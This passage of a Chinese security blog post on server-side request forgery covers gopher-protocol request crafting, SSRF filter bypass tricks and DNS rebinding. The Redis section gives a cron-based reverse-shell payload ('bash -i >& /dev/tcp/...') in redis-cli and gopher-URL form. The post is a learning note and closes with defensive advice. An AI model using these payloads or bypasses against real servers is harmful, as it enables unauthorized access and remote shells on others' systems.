+因为Burp是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码<br>这样到达服务器一次解码得到的就是<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A</span><br></pre></td></tr></table></figure>
+这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事</li>
+</ul>
+<p>gopher发送post请求<br>和get请求一样，放入脚本编码后即可放入url中。<br>post请求：如果是Content-type为application&#x2F;x-www-form-urlencoded，那么POST数据也应进行二次编码（该选项含义就是URL编码后的数据）</p>
+<p>使用注意事项</p>
+<ul>
+<li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
+<li>file_get_contents 的 gopher 协议不能 URLencode</li>
+<li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
+<li>PHP 的 curl 默认不 follow 302 跳转</li>
+<li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262430#h3-5">gopher协议</a></p>
+<h2 id="Redis未授权攻击"><a href="#Redis未授权攻击" class="headerlink" title="Redis未授权攻击"></a>Redis未授权攻击</h2><p>常用redis命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
+<p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span><br></pre></td></tr></table></figure>
+<p>经过url解码便是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p>URL的完整格式是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure>
+<p>所以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”http://baidu.com@1.1.1.1″”&gt;http://baidu.com@1.1.1.1</span><br><span class="line">和</span><br><span class="line">http://1.1.1.1</span><br><span class="line">效果相同，因为解析的本来就是@后面的服务器地址</span><br></pre></td></tr></table></figure>
+
+<h2 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h2><p>以PHP为例，一般后端用正则匹配IP长这个样子:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = &#x27;&#x27;;$isMatched = preg_match_all(&#x27;/((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;, $str, $matches);var_dump($isMatched, $matches);</span><br></pre></td></tr></table></figure>
+<p>所以可以换成各种进制进行绕过:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure>
+<p>这些表达方式都能被curl命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用 16 进制0x0A000003表示IP地址，还有一个很少人知道的绕过小姿势，就是用 8 进制代替 10 进制来表示 IP 地址。在计算机的世界里，一旦在20前面加个0就会变成8进制，比如<code>http://01200000003实际上还是http://10.0.0.3</code><br>上面两个表达方式，PHP 的 curl 模块能解析出来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure>
+
+<h2 id="重定向绕过-amp-短网址绕过"><a href="#重定向绕过-amp-短网址绕过" class="headerlink" title="重定向绕过&amp;短网址绕过"></a>重定向绕过&amp;短网址绕过</h2><p>一般来说，PHP里的重定向长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpfunction redirect($url)&#123;    header(&quot;Location: $url&quot;);    exit();&#125;</span><br></pre></td></tr></table></figure>
+<p>如果192.168.0.1.xip.io都被过滤了，但是重定向没有被控制；你可以去<strong>TINYURL</strong>生成一个短URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问短URL的流程就是</span><br><span class="line">https://tinyurl.com/4czmrv9d-&gt;302跳转-&gt;成功访问192.168.0.1</span><br><span class="line">这样就成功绕过了检查</span><br></pre></td></tr></table></figure>
+
+<h2 id="冷门协议绕过"><a href="#冷门协议绕过" class="headerlink" title="冷门协议绕过"></a>冷门协议绕过</h2><p>如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://系列zip:// &amp; bzip2:// &amp; zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://</span><br></pre></td></tr></table></figure>
+
+<h2 id="特殊用法绕过"><a href="#特殊用法绕过" class="headerlink" title="特殊用法绕过"></a>特殊用法绕过</h2><p>下面这俩可以试试绕过127.0.0.1:80，不一定有效</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[::]:80/ http://0000::1:80/http://0/</span><br></pre></td></tr></table></figure>
+<p>中文句号也可以试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192。168。0。1</span><br></pre></td></tr></table></figure>
+
+<h2 id="xip-io和xip-name"><a href="#xip-io和xip-name" class="headerlink" title="xip.io和xip.name"></a>xip.io和xip.name</h2><p><strong>xip.io</strong> 是一个提供通配符 DNS 解析的魔法域名。你可以无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。<br><strong>xip.name</strong> 是受 xip.io 启发，使用 Golang 开发的一个支持通配符的 DNS 服务器。<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1825757">详细解释</a></p>
+<h2 id="Enclosed-alphanumerics字符集绕过"><a href="#Enclosed-alphanumerics字符集绕过" class="headerlink" title="Enclosed alphanumerics字符集绕过"></a>Enclosed alphanumerics字符集绕过</h2><p>可在该网站挑选合适的字符进行替代：<a target="_blank" rel="noopener" href="https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF">替代字符</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ⓌⓌⓌ.ⓑⓐⓘⓓⓤ.ⓒⓞⓜ 完全等价于 https://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>当然，适用于域名而不适用与直接IP访问</p>
+<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p>
+<ul>
+<li>判定逻辑：<br>判定所给的IP或者域名解析后的IP是否在黑名单中<br>若在，退出报错<br>若不在，再次访问所给的IP或者域名解析后的IP；执行后续业务模块<br>所以思路很简单：只需要有个域名，但是它映射两个IP；同时设置TTL为0，能方便两个IP即刻切换<br>效果类比：访问wwfcww.xyz这个域名，第一次解析的IP是192.168.0.1；而第二次解析的IP是127.0.0.1<br>这个操作，就叫做DNS重绑定，如此一来便可进行SSRF攻击。</li>
+</ul>
+<h1 id="SSRF的防御"><a href="#SSRF的防御" class="headerlink" title="SSRF的防御"></a>SSRF的防御</h1><ul>
+<li>限制协议<br>仅允许http&#x2F;https请求</li>
+<li>限制IP<br>避免应用被用来获取内网数据，攻击内网</li>
+<li>限制端口<br>限制请求的端口为http常用的端口，比如80, 443, 8080, 8090</li>
+<li>过滤返回信息<br>验证远程服务器对请求的响应是比较简单的方法</li>
+<li>统一错误信息<br>避免用户可以根据错误信息来判断远端服务器的端口状态</li>
+</ul>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>仍然有很多不太清晰的地方，主要在协议和DNS重定向方面。以后刷题来弥补吧。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262430">学习一年的SSRF总结</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/09/SSRF/" title="SSRF服务端请求伪造">http://example.com/2022/12/09/SSRF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/08/OS%E4%B9%A0%E9%A2%98%E8%A7%A3%E6%9E%90/" rel="prev" title="OS习题解析">
+      <i class="fa fa-chevron-left"></i> OS习题解析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="nav-number">3.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF"><span class="nav-number">4.</span> <span class="nav-text">漏洞场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">6.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#file-get-contents"><span class="nav-number">6.1.</span> <span class="nav-text">file_get_contents</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fsockopen"><span class="nav-number">6.2.</span> <span class="nav-text">fsockopen</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl-exec"><span class="nav-number">6.3.</span> <span class="nav-text">curl_exec</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">相关协议</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#File%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.1.</span> <span class="nav-text">File协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.2.</span> <span class="nav-text">HTTP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.3.</span> <span class="nav-text">dict协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="nav-number">7.4.</span> <span class="nav-text">gopher协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB"><span class="nav-number">7.5.</span> <span class="nav-text">Redis未授权攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="nav-number">8.</span> <span class="nav-text">绕过手法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">8.1.</span> <span class="nav-text">@绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-number">8.2.</span> <span class="nav-text">进制绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87-amp-%E7%9F%AD%E7%BD%91%E5%9D%80%E7%BB%95%E8%BF%87"><span class="nav-number">8.3.</span> <span class="nav-text">重定向绕过&amp;短网址绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B7%E9%97%A8%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-number">8.4.</span> <span class="nav-text">冷门协议绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E7%94%A8%E6%B3%95%E7%BB%95%E8%BF%87"><span class="nav-number">8.5.</span> <span class="nav-text">特殊用法绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xip-io%E5%92%8Cxip-name"><span class="nav-number">8.6.</span> <span class="nav-text">xip.io和xip.name</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enclosed-alphanumerics%E5%AD%97%E7%AC%A6%E9%9B%86%E7%BB%95%E8%BF%87"><span class="nav-number">8.7.</span> <span class="nav-text">Enclosed alphanumerics字符集绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="nav-number">8.8.</span> <span class="nav-text">DNS重绑定</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">9.</span> <span class="nav-text">SSRF的防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">10.</span> <span class="nav-text">后记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">11.</span> <span class="nav-text">致谢</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bron"
+      src="/images/Elaina.png">
+  <p class="site-author-name" itemprop="name">Bron</p>
+  <div class="site-description" itemprop="description">原谅我这一生不羁放纵爱自由</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">78</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthnian" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthnian" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Elaina_Anime" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Elaina_Anime" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/2CTruth" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;2CTruth" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://truthnian.github.io/" title="https:&#x2F;&#x2F;truthnian.github.io" rel="noopener" target="_blank">世界上最好的网站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Thu Nov 03 2022 08:00:00 GMT+0800 (台北標準時間) – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bron</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">148k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:14</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/3/2022 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已存活 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#FFFFE0',
+  buttonColorLight: '#00BFFF',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+    </div>
+</body>
+</html>
+
+
